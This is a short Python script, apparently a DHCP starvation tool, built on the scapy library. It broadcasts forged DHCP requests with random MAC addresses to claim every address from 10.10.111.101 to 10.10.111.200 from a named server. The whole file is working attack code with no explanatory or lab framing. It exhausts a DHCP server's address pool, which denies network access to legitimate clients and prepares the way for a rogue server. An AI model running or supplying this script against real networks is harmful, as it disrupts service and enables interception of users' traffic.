from scapy.all import *

DST_MAC = 'ff:ff:ff:ff:ff:ff'
DST_IP = '255.255.255.255'
SRC_IP = '0.0.0.0'
SERVER_ID = '10.10.111.1'

def main():

    for i in range(101, 201):
        src_mac = RandMAC()
        request_ip = '10.10.111.' + str(i)
        ether = Ether(src=src_mac, dst=DST_MAC)
        ip = IP(src=SRC_IP, dst=DST_IP)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=src_mac)
        dhcp = DHCP(options=[('message-type', 'request'), 
                             ('server_id', SERVER_ID), 
                             ('requested_addr', request_ip), 'end'])
        packet = ether/ip/udp/bootp/dhcp
        sendp(packet)


if __name__ == '__main__':
    main()
